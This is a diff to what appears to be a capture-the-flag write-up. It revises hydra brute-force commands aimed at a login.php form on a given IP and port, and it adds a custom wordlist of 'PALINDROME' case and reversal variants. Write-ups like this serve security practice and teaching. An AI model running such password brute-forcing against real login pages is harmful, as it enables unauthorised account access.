@@ -175,8 +175,28 @@ This was because the **/login.php** page did not display the message "Invalid us
 To work around this, I made a copy of the original password file, took out the line with "0" and then used the modified password file `newpassword.lst` instead:
 
 ```bash
-hydra -l admin -p ./newpassword.lst -s 18926 188.166.189.68 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
+hydra -l admin -P ./newpassword.lst -s 18926 188.166.189.68 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
 ```
 
-No password found with this password list. On a hunch, I decided to generate a custom password list comprising 10-character words from the letters "PALINDROME", with various combinations of different letter case, e.g. "Palindrome", "PALINDROME", "PalinDrome".
+No password found with this password list. On a hunch, I decided to generate a custom password list comprising 10-character words from the letters "PALINDROME", with various combinations of different letter case, e.g. "Palindrome", "PALINDROME", "PalinDrome", and also trying the letters of the word "PALINDROME" in reverse.
 
+My `palindrome.lst` password file contained:
+
+```
+palindrome
+PALINDROME
+Palindrome
+PaLinDrome
+PalinDrome
+emordnilap
+EMORDNILAP
+emordnilaP
+emorDnilaP
+emorDniLaP
+```
+
+Running **hydra** with this `palindrome.lst` password file:
+
+```bash
+hydra -l admin -P ./palindrome.lst -s 18926 188.166.189.68 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
+```
